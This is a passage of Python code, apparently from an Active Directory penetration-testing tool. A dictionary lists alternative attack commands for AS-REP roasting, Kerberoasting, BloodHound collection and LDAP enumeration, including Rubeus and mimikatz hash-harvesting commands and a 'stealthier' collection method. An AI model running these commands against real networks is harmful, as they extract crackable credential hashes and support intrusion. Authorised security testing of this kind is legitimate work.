            ],
            'asreproast': [
                'Rubeus.exe asreproast /format:hashcat',
                'Manual: craft AS-REQ without PA-ENC-TIMESTAMP using impacket',
                'ASRepCatcher for passive network capture'
            ],
            'kerberoast': [
                'Rubeus.exe kerberoast /outfile:hashes.txt',
                'PowerView: Get-DomainSPNTicket -Format Hashcat',
                'Manual: Add-Type .NET KerberosRequestorSecurityToken + mimikatz export'
            ],
            'bloodhound': [
                'SharpHound.exe -c All (from Windows)',
                'SoaPy + BOFHound (stealthier via ADWS)',
                'Manual PowerView enumeration script'
            ],
            'ldap': [
                'ldapsearch command-line queries',
                'ADExplorer.exe (SysInternals GUI)',
                'Manual: telnet <DC> 389 → LDAP bind requests'
            ]
        }

        for key, cmds in alternatives.items():
            if key in task_id:
                return cmds

        return []
